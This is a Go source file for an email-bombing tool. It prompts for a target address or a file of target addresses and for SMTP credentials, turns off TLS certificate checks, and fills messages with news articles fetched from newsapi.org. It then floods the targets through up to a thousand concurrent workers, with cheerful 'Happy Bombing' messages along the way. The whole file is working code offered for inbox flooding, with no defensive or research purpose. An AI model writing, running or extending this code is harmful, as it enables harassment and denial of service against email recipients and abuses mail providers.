package bomber

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"go_cli/fileutil"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
	"gopkg.in/gomail.v2"
)

type SmtpOpts struct {
	Host     string
	Port     string
	Username string
	Password string
	Default  bool
}

type SmtpConnOpts struct {
	Conn      gomail.SendCloser
	NumErrors int
	NewConn   bool
}

func SmtpConnClose(conns []gomail.SendCloser) {
	for _, conn := range conns {
		if conn != nil {
			conn.Close()
		}
	}
}

func Bomber() {
	reader := bufio.NewReader(os.Stdin)

	color.New(color.FgRed).Print("\nShould the default newsapi.org api key fail, kindly register a new account.\nGet a new api key from the dashboard and restart the tool using that.\n\n")
	fmt.Print("Continue with a default newsapi.org api key? Y/n :> ")
	ChooseKey, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	} else if ChooseKey == "\n" {
		fmt.Println("Invalid choice!")
		return
	}
	trimmedChooseKey := strings.ToLower(strings.TrimSpace(ChooseKey))
	var apiKey string
	if !strings.Contains(trimmedChooseKey, "y") {
		fmt.Print("\nEnter your api key :> ")
		rawKey, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		} else if rawKey == "\n" {
			fmt.Println("Empty key not accepted!")
			return
		}
		apiKey = strings.TrimSpace(rawKey)
	}

	var smtpCreds SmtpOpts
	fmt.Print("\nwant to use a default SMTP provided by the tool? Y/n :> ")
	rawSmtpChoice, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	} else if rawSmtpChoice == "\n" {
		fmt.Println("invalid choice!")
		return
	}

	trimmedSmtpChoice := strings.ToLower(strings.TrimSpace(rawSmtpChoice))

	if strings.Contains(trimmedSmtpChoice, "y") {
		smtpCreds = SmtpOpts{
			Host:     os.Getenv("SMTP_HOST"),
			Port:     os.Getenv("SMTP_PORT"),
			Username: os.Getenv("SMTP_USERNAME"),
			Password: os.Getenv("SMTP_PASSWORD"),
			Default:  true,
		}
	} else {
		var filteredCreds []string
		fmt.Println("\nEnter your SMTP Credentials. Format >  HOST,PORT,USERNAME,PASSWORD")
		fmt.Print(">>> ")
		rawSmtpCreds, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		} else if rawSmtpCreds == "\n" {
			fmt.Println("invalid input!")
			return
		}
		splitedCreds := strings.Split(rawSmtpCreds, ",")
		for _, creds := range splitedCreds {
			trimmedCreds := strings.TrimSpace(creds)
			if len(trimmedCreds) != 0 {
				filteredCreds = append(filteredCreds, trimmedCreds)
			}
		}
		smtpCreds.Host = filteredCreds[0]
		smtpCreds.Port = filteredCreds[1]
		smtpCreds.Username = filteredCreds[2]
		smtpCreds.Password = filteredCreds[3]
		smtpCreds.Default = false
	}

	fmt.Println("\nverifying SMTP Credentials...")
	port, _ := strconv.Atoi(smtpCreds.Port)
	dialer := gomail.NewDialer(smtpCreds.Host, port, smtpCreds.Username, smtpCreds.Password)
	dialer.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	conn, err := dialer.Dial()
	if err != nil {
		if smtpCreds.Default {
			fmt.Printf("err: %v\n", err)
			fmt.Println("The default SMTP Credentials is dead. Please use your own SMTP.")
		} else {
			fmt.Printf("err: %v\n", err)
		}
		return
	}
	smtpConn := SmtpConnOpts{Conn: conn, NewConn: true}
	color.New(color.FgGreen).Printf("\nSMTP connection has been established.\n")

	fmt.Print("\nis your target more than 1? Y/n :> ")
	rawNumTarget, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	} else if rawNumTarget == "\n" {
		fmt.Println("invalid choice!")
		return
	}
	numTarget := strings.ToLower(strings.TrimSpace(rawNumTarget))
	var targetEmail string
	var targetList []string
	if strings.Contains(numTarget, "y") {
		fmt.Println("\nSelect your target list: ")
		filePath, err := zenity.SelectFile(
			zenity.FileFilters{
				{Patterns: []string{"*.txt"}, CaseFold: false},
			})
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		}
		targetList, err = fileutil.ReadFromFile(filePath)
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		}
		fmt.Printf("Total Target Emails: %d", len(targetList))
	} else {
		fmt.Print("\nEnter the email to bomb :> ")
		fmt.Scanln(&targetEmail)
		if len(targetEmail) == 0 {
			fmt.Println("invalid input!")
			return
		}
	}
	fmt.Print("\nEnter number of emails to send :> ")
	numEmails, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	} else if numEmails == "\n" {
		fmt.Println("invalid input!")
		return
	}
	numEmails = strings.TrimSpace(numEmails)
	numBombs, _ := strconv.Atoi(numEmails)

	var wg sync.WaitGroup
	var mutex sync.Mutex
	msgOpts := gomail.NewMessage()

	pgBar := MakePgBar(numBombs, "Bombing... ->")

	fmt.Println("\nfetching news data...")
	body, err := GetMsgContent(apiKey)
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	var numValidArticles []int
	if body.TotalResults > 0 {
		color.New(color.FgGreen).Printf("\nFetch was successful. Happy Bombing :)\n")
		for _, article := range body.Articles {
			if article.Content != "" {
				numValidArticles = append(numValidArticles, 1)
			}
		}
	} else {
		fmt.Printf("body: %v\n", body)
		color.New(color.FgRed).Println("The api has reached it's limit.\nKindly visit newsapi.org to register a new account.\nGet the api key from the dashboard and restart the tool with the given api key.")
		return
	}
	if len(targetList) == 0 {
		maxWorkers := len(numValidArticles)
		msgOpts.SetHeader("To", targetEmail)
		chunkSize := numBombs / maxWorkers

		if numBombs%maxWorkers != 0 {
			chunkSize++
		}

		workingChan := make(chan []int, chunkSize)
		articleChunks := make(chan Article, 1)
		distSlice := make([]int, numBombs)
		for i := 0; i < numBombs; i++ {
			distSlice[i] = i
		}
		if smtpCreds.Host == "smtp.gmail.com" {
			for i := 0; i < maxWorkers; i++ {
				wg.Add(1)
				go HandleGmailSMTP(articleChunks, workingChan, &wg, &mutex, msgOpts, smtpCreds, pgBar, &smtpConn)
			}
		} else {
			for i := 0; i < maxWorkers; i++ {
				wg.Add(1)
				go SingleBomb(articleChunks, workingChan, &wg, &mutex, msgOpts, smtpCreds, pgBar, &smtpConn)
			}
		}

		articles := body.Articles
		for _, article := range articles {
			if article.Content != "" {
				articleChunks <- article
			}

		}
		close(articleChunks)

		for i := 0; i < numBombs; i += chunkSize {
			end := i + chunkSize
			if end > numBombs {
				end = numBombs
			}
			workingChan <- distSlice[i:end]
		}
		close(workingChan)

		wg.Wait()
		fmt.Println("\n\nall done.")
	} else {
		maxWorkers := 1000
		chunkSize := len(targetList) / maxWorkers

		if len(targetList)%maxWorkers != 0 {
			chunkSize++
		}

		emailChunks := make(chan []string, chunkSize)
		articleChunks := make(chan Article, 1)

		for i := 0; i < maxWorkers; i++ {
			wg.Add(1)
			go MultiTargetBomb(articleChunks, emailChunks, &wg, &mutex, msgOpts, smtpCreds, numBombs, &smtpConn)
		}

		for i := 0; i < len(targetList); i += chunkSize {
			end := i + chunkSize
			if end > len(targetList) {
				end = len(targetList)
			}
			emailChunks <- targetList[i:end]
		}
		close(emailChunks)

		articles := body.Articles
		go func() {
			process := true
			for process {
				select {
				case _, ok := <-articleChunks:
					if !ok {
						process = false
					}
				default:
					for _, article := range articles {
						if article.Content != "" {
							articleChunks <- article
						}
					}
				}
			}
		}()

		wg.Wait()
		close(articleChunks)
		fmt.Println("\n\nall done.")
		os.Exit(0)
	}

}
